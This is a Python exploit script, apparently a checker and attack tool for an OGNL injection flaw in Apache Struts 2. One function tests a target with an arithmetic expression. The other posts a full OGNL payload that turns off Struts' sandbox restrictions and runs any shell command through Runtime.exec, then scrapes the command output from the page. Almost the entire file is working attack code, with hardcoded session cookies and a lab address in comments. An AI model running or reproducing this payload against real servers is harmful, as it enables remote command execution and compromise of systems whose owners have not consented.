import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exp_check(url):
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0)Gecko/20100101 Firefox/107.0',
               'Cookie': 'JSESSIONID=node01baaem30ruljjhu8tnscji5ep3.node0'}
    c='?id=%25{21*7}'
    # url = sys.argv[1]+'.action'
    # url ='http://192.168.67.134:8080/'
    try:
        res1 = requests.get(url+c,headers=headers)
        if '147' in res1.text:
            return 1
        return 2
    except:
        return 3
def exp_cmd(url,cmd):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
               'Cookie': 'JSESSIONID=48FCD5D2DFB1E3CDF753E62011186CBC',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
               'Content-Type': 'application/x-www-form-urlencoded'}

    # url = 'http://192.168.67.134:8080/'
    # cmd = 'uname'
    data = "id=%25%7b(%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct%3d%23request['struts.valueStack'].context).(%23cr%3d%23ct['com.opensymphony.xwork2.ActionContext.container']).(%23ou%3d%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.setExcludedPackageNames('')).(%23ou.setExcludedClasses('')).(%23ct.setMemberAccess(%23dm)).(%23a%3d@java.lang.Runtime@getRuntime().exec('" + cmd + "')).(@org.apache.commons.io.IOUtils@toString(%23a.getInputStream()))%7d"


    try:
        res2 = requests.post(url, data=data, headers=headers)
        # print(res2.text)
        string = res2.text
        # 匹配 <a id=" 和 " href=" 之间的内容
        pattern = r"<a id=\"(.*?)\n\" href="
        # pattern = r"<a id=\"(.*?)\n"
        match = re.search(pattern, string)
        matched_string = match.group(1)
        print(matched_string)
        return matched_string
    except:
        return 3


if __name__ == '__main__':
    pass
    # url=sys.argv[1]
    # cmd=sys.argv[2]
    # # exp_check(url)
    # # print(exp_check(url))
    # exp_cmd(url,cmd)



